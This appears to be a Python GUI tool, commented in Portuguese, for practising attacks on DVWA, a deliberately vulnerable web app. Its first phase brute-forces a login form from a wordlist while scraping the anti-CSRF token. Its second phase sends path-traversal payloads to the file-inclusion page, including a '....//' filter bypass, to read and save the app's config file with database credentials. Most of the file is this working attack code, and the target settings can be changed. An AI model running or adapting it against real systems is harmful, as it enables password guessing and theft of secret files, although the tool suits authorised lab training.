#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DVWA Tester - Brute Force + LFI File Checker (versão corrigida)
Uso autorizado apenas (laboratório / pentest com permissão).
Dependências: pip install requests
"""

import threading
import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext
import requests
import re
import os
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class DvwaTool:
    def __init__(self, root):
        self.root = root
        self.root.title("DVWA Brute Force")
        self.root.geometry("780x620")
        self.running = False
        self.session = requests.Session()
        self._build_ui()

    def _build_ui(self):
        frame = ttk.LabelFrame(self.root, text="Configuração", padding=10)
        frame.pack(fill="x", padx=10, pady=5)

        ttk.Label(frame, text="URL Login:").grid(row=0, column=0, sticky="w")
        self.url_entry = ttk.Entry(frame, width=58)
        self.url_entry.insert(0, "http://192.168.0.11/dvwa/login.php")
        self.url_entry.grid(row=0, column=1, pady=3)

        ttk.Label(frame, text="Wordlist:").grid(row=1, column=0, sticky="w")
        self.wordlist_entry = ttk.Entry(frame, width=58)
        self.wordlist_entry.grid(row=1, column=1, pady=3)
        ttk.Button(frame, text="Procurar...", command=self._browse).grid(row=1, column=2)

        ttk.Label(frame, text="Usuário:").grid(row=2, column=0, sticky="w")
        self.user_entry = ttk.Entry(frame, width=30)
        self.user_entry.insert(0, "admin")
        self.user_entry.grid(row=2, column=1, sticky="w", pady=3)

        ttk.Label(frame, text="Arquivo alvo (LFI):").grid(row=3, column=0, sticky="w")
        self.file_entry = ttk.Entry(frame, width=58)
        self.file_entry.insert(0, "/var/www/dvwa/config/config.inc.php")
        self.file_entry.grid(row=3, column=1, pady=3)

        btn_frame = ttk.Frame(frame)
        btn_frame.grid(row=4, column=1, sticky="w", pady=5)
        self.btn_start = ttk.Button(btn_frame, text="Iniciar", command=self.start)
        self.btn_start.pack(side="left", padx=3)
        self.btn_stop = ttk.Button(btn_frame, text="Parar", command=self.stop, state="disabled")
        self.btn_stop.pack(side="left", padx=3)

        out_frame = ttk.LabelFrame(self.root, text="Saída", padding=5)
        out_frame.pack(fill="both", expand=True, padx=10, pady=5)
        self.log = scrolledtext.ScrolledText(out_frame, state="disabled", font=("Consolas", 9))
        self.log.pack(fill="both", expand=True)

    def _browse(self):
        path = filedialog.askopenfilename(title="Selecione a wordlist")
        if path:
            self.wordlist_entry.delete(0, "end")
            self.wordlist_entry.insert(0, path)

    def log_msg(self, msg):
        self.log.configure(state="normal")
        self.log.insert("end", msg + "\n")
        self.log.see("end")
        self.log.configure(state="disabled")

    def start(self):
        url = self.url_entry.get().strip()
        wordlist = self.wordlist_entry.get().strip()
        if not url or not wordlist:
            messagebox.showerror("Erro", "Informe a URL e a wordlist.")
            return
        if not os.path.isfile(wordlist):
            messagebox.showerror("Erro", "Wordlist não encontrada.")
            return
        # nova sessão a cada execução
        self.session = requests.Session()
        self.running = True
        self.btn_start.configure(state="disabled")
        self.btn_stop.configure(state="normal")
        threading.Thread(target=self.run, args=(url, wordlist), daemon=True).start()

    def stop(self):
        self.running = False
        self.btn_start.configure(state="normal")
        self.btn_stop.configure(state="disabled")

    def _get_token(self, url):
        r = self.session.get(url, verify=False, timeout=10)
        m = re.search(r"user_token'?\s*value='([^']+)'", r.text)
        return m.group(1) if m else None

    def _save_found(self, content, tag):
        fname = f"encontrado_{tag}.txt"
        with open(fname, "w", encoding="utf-8", errors="replace") as f:
            f.write(content)
        self.log_msg(f"[+] Conteúdo salvo em: {os.path.abspath(fname)}")

    def run(self, url, wordlist):
        base = url.rsplit("/", 1)[0]  # ex: http://192.168.0.11/dvwa

        # ---- Etapa 1: obter credenciais válidas ----
        self.log_msg("[*] Fase 1: Brute force no login")
        creds = None
        try:
            # pula linhas vazias e comentários (# ...) da wordlist
            with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
                passwords = [l.strip() for l in f
                             if l.strip() and not l.lstrip().startswith("#")]
        except Exception as e:
            self.log_msg(f"[!] Erro ao ler wordlist: {e}")
            self._done()
            return

        self.log_msg(f"\n[*] {len(passwords)} senhas carregadas\n")

        for pwd in passwords:
            if not self.running:
                break
            try:
                token = self._get_token(url)
                data = {
                    "username": self.user_entry.get().strip(),
                    "password": pwd,
                    "Login": "Login",
                }
                if token:
                    data["user_token"] = token
                r = self.session.post(url, data=data, verify=False, timeout=10,
                                      allow_redirects=True)
                # Falha = redireciona de volta para login.php
                if "login.php" not in r.url and r.status_code == 200:
                    self.log_msg(f"\n[+] CREDENCIAL VÁLIDA: {data['username']} / {pwd}\n\n")
                    creds = (data["username"], pwd)
                    break
                self.log_msg(f"    Testando: {data['username']}:{pwd:<50} -> falha")
            except Exception as e:
                self.log_msg(f"[!] Erro: {e}")

        if not creds:
            self.log_msg("\n[-] Nenhuma credencial Encontrada. Continuando teste LFI sem login\n")

        # ---- Etapa 2: testar LFI para ler o arquivo de config ----
        target_file = self.file_entry.get().strip()
        self.log_msg(f"[*] Fase 2: Testando LFI para {target_file}\n")

        traversal = "../" * 6 + target_file.lstrip("/")
        candidates = [
            traversal,                                   # traversal relativo
            traversal.replace("../", "....//"),          # bypass básico de filtro
            "/" + target_file.lstrip("/"),               # caminho absoluto direto
            "..\\..\\" * 6 + target_file.lstrip("/"),    # windows-style (bypass alternativo)
        ]

        lfi_url = f"{base}/vulnerabilities/fi/?page="
        found = False
        for payload in candidates:
            if not self.running or found:
                break
            try:
                r = self.session.get(lfi_url + payload, verify=False, timeout=10)
                if "db_" in r.text or "$_DVWA" in r.text or "config.inc" in r.text:
                    self.log_msg(f"[+] ARQUIVO ENCONTRADO via payload: {payload}")
                    self._save_found(r.text, "lfi_config")
                    found = True
                else:
                    self.log_msg(f"    Tentativa '{payload[:60]}...' -> sem conteúdo do config")
            except Exception as e:
                self.log_msg(f"[!] Erro: {e}")

        if not found:
            self.log_msg("\n[-] LFI não confirmado. Verifique se está logado e se o nível")
            self.log_msg("    de segurança do DVWA está em: low     (http://SEU_IP/dvwa/security.php)\n")

        self._done()

    def _done(self):
        self.running = False
        self.root.after(0, lambda: (self.btn_start.configure(state="normal"),
                                    self.btn_stop.configure(state="disabled")))
        self.log_msg("\n\n[*] Finalizado")


if __name__ == "__main__":
    root = tk.Tk()
    app = DvwaTool(root)
    root.mainloop()
